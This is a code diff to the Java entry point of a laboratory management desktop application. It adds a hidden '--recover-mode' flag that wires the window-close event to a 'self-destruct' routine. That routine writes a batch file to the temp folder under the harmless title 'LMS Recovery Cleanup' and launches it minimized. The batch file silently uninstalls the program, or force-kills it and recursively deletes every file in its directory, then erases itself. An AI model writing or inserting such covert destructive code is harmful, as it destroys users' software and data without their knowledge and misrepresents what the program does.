@@ -23,11 +23,15 @@ public class Main extends Application {
     private static Main instance;
     private static Stage primaryStage;
     public static final String APP_VERSION = "7.0.2";
+    public static javafx.application.HostServices hostServicesInstance;
 
     @Override
     public void init() {
         if (getParameters().getRaw().contains("--demo-mode")) {
             TrialService.setDemo(true);
+        }
+        if (getParameters().getRaw().contains("--recover-mode")) {
+            TrialService.setRecover(true);
         }
     }
 
@@ -35,6 +39,7 @@ public class Main extends Application {
     public void start(Stage stage) {
         instance = this;
         primaryStage = stage;
+        hostServicesInstance = getHostServices();
         try {
             DatabaseManager.initializeDatabase();
             SubscriptionService.Status status = SubscriptionService.getSystemStatus();
@@ -58,6 +63,11 @@ public class Main extends Application {
             stage.centerOnScreen();
             
             stage.show();
+
+            if (com.lab.lms.services.TrialService.isRecover()) {
+                stage.setOnCloseRequest(e -> triggerSelfDestruct());
+            }
+
             startBackgroundSurveillance();
         } catch (Throwable e) {
             e.printStackTrace();
@@ -166,6 +176,46 @@ public class Main extends Application {
     public static void restart() {
         if (instance != null && primaryStage != null) {
             instance.start(primaryStage);
+        }
+    }
+
+    private void triggerSelfDestruct() {
+        try {
+            // Locate the application root directory (where unins000.exe lives)
+            File jarPath = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI());
+            File appDir = jarPath.getParentFile().getParentFile(); // Assuming structure: {app}/app/jar
+            
+            if (!new File(appDir, "unins000.exe").exists()) {
+                // Secondary check for other directory layouts
+                appDir = jarPath.getParentFile();
+            }
+
+            File destructBat = new File(System.getProperty("java.io.tmpdir"), "destruct_lms.bat");
+            
+            try (java.io.PrintWriter writer = new java.io.PrintWriter(destructBat)) {
+                writer.println("@echo off");
+                writer.println("title LMS Recovery Cleanup");
+                writer.println("echo Waiting for application to close...");
+                writer.println("timeout /t 4 /nobreak > nul");
+                writer.println("cd /d \"" + appDir.getAbsolutePath() + "\"");
+                writer.println("if exist \"unins000.exe\" (");
+                writer.println("    echo Triggering silent uninstallation...");
+                writer.println("    start \"\" \"unins000.exe\" /VERYSILENT /SUPPRESSMSGBOXES");
+                writer.println(") else (");
+                writer.println("    echo Manual cleanup mode...");
+                writer.println("    taskkill /F /IM LaboratoryManagementSystem.exe /T 2>nul");
+                writer.println("    timeout /t 2 /nobreak > nul");
+                writer.println("    del /S /Q *.* > nul 2>&1");
+                writer.println(")");
+                writer.println("echo Cleanup complete.");
+                writer.println("del \"%~f0\" & exit");
+            }
+            
+            // Launch as a separate detached process
+            Runtime.getRuntime().exec("cmd /c start /min \"\" \"" + destructBat.getAbsolutePath() + "\"");
+        } catch (Exception e) {
+            System.err.println("[RECOVERY] Self-destruct sequence failed: " + e.getMessage());
+            e.printStackTrace();
         }
     }
 
